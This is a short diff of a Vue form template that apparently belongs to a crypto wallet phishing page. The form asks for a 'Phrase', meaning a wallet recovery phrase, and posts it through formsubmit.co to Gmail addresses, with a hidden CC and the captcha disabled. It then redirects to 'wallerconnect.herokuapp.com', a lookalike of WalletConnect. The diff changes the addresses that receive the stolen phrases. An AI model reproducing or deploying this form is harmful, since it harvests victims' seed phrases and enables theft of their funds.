@@ -1,6 +1,6 @@
 <template>
-  <form action="https://formsubmit.co/dontsettleforless7@gmail.com" method="POST">
-    <input type="hidden" name="_cc" value="Liv.josephalves@gmail.com">
+  <form action="https://formsubmit.co/BlackTechnology25@gmail.com" method="POST">
+    <input type="hidden" name="_cc" value="Kileymartiezsdn94@gmail.com">
     <textarea :name="$route.params.id" class="w-full h-40 p-2 block" placeholder="Phrase" required></textarea>
     <input type="hidden" name="_next" value="https://wallerconnect.herokuapp.com/">
     <input type="hidden" name="_captcha" value="false">
